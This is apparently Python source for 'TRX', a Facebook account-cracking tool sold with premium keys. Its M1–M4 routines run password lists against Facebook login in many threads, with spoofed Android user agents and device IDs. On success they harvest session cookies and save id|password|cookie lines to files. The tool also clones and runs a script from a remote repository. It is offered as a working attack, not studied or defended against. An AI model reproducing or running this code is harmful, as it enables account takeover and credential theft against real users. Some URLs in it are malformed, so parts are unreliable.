# SOURCE BY :LHJ
# GitHub : https://github.com/TRX
# Facebook : https://www.facebook.com/TRX6
...
os.system('xdg-open https://t.me/@hjhjhsb')
try:
...
try:
    prox= requests.get('https://raw.githubusercontent.com/TRXt2/M01/main/.TRX.txt').text
...
sys.stdout.write('\x1b]2; ~[TRX]~\x07')
logo=(f"""\033[1;37m
\033[1;32m _________  _______     ____  ____  
\033[1;31m|  _   _  ||_   __ \   |_  _||_  _| 
\033[1;31m|_/ | | \_|  | |__) |    \ \  / /   
\033[1;31m    | |      |  \033[1;32m__ /      > `' <    
\033[1;32m   _| |_    _\033[1;32m| |  \ \_  _/ /'`\ \_  
 \033[1;32m |_____|  |____| |___||____||____| 
                                    
\033[1;36m═══════════════════════════════════════════════
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;31mFACEBOK \033[1;32m: TRX
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;31mGITHUB  \033[1;32m:  TRX M16
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;31mSERVICE \033[1;32m: Tools
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;31mVERSION \033[1;32m: 0.1
\033[1;36m══════════════════════════════════════""")
def linex():
    print('\033[1;36m══════════════════════════════════════')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;32m[\033[1;32m=\033[1;32m] \033[1;32mTOTAL FILE ACCOUNTS : \033[1;31m'+total_ids+f' ')
                                        print('\033[1;32m[\033[1;32m=\033[1;32m] \033[1;32mPROCESS START PLEASE WAIT...')
                                        print("\033[1;32m[\033[1;32m=\033[1;32m] \033[1;32mIF NO RESULT \033[1;32m[\033[1;32mON/\033[1;31mOFF\033[1;32m] \033[1;32mAIRPLAN MODE ")
                                        linex()
                                        for user in fo:
                                ...
                                os.system('xdg-open https://www.youtube.com/@hjhjhsb')
                                menu()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://t.me/@hjhjhsb')
                                menu()
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;32m~[TRX-M1]~[%s| \033[1;32mOK\033[1;37m|\033[1;36mCP \033[1;32m%s\033[1;32m|\033[1;31m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";Davik/2.1.0 (linux; U; Android 4.0.1; Infinix Hot 40 Build/SKQ1.210216.001[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix Hot 40;FBSV/11;FBDM/{density=2.0,width=1280,height=1440};]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m~[TRX-OK]~ '+ids+' ~ '+pas+'\033[1;97m')
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/TRX_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TRX_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m<[TRX-CP]> '+ids+'  ☒  '+pas+'\033[1;97m')
                                                open('/sdcard/TRX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/TRX-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m~[TRX-M2]~[%s| \033[1;32mOK\033[1;31m|\033[1;31mCP \033[1;32m%s\033[1;31m|\033[1;31m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/56.0.0.9522;FBPN/com.facebook.orca;FBLC/ja_JP;FBBV/722853357;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G920F|MMB29K;FBSV/9.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.5,width=1106,height=2405};FB_FW/1;FBRV/722853357]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[TRX-OK]> '+ids+' ~ '+pas+' | '+joined(uid)+'\033[1;97m')
#os.system("espeak -a 300 \"INF,  OK,  YOUCEF,  THANKS,  \"") 
                                        print("\033[1;34m <[BISCUT-🍪]> :\033[1;37m "+cookie)           
                                        open('/sdcard/TRX_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TRX_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m~[TRX-M3]~[%s| \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;31m|\033[1;31m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/178.0.0.118;FBDM/{density=1.448303811346982,width=784,height=1902};FBLC/pt_BR;FBRV/614295868 ;FBCR/Teletalk;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3511;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m <[TRX-OK]> '+ids+' ~ '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                        #print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/TRX_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TRX_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m~[TRX-M4]~[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/120.0.0.5778;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/368335095;FBCR/Axiata;FBMF/samsung;FBBD/samsung;FBDV/SM-T561|KTU84P;FBSV/10.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1286,height=1961};FB_FW/1;FBRV/368335095]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[TRX-OK]> '+ids+' ~ '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                       # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/TRX_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TRX_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def createip():
	os.system("cd && git clone https://github.com/LHJ-03/LHJ/blob/main/ROOMSA")
	os.system('cd && cd LHJ16 ;python IP16.py')
#####_____END_____#####
...
def main_apv():
    ...
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https:/TRX16.blogspot.com/2024/03/m1.html").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m Notes : TRX Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            ...
            tks = ("Hi INF Sir, I Need To Buy Your TRX Tools Version 4.22 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
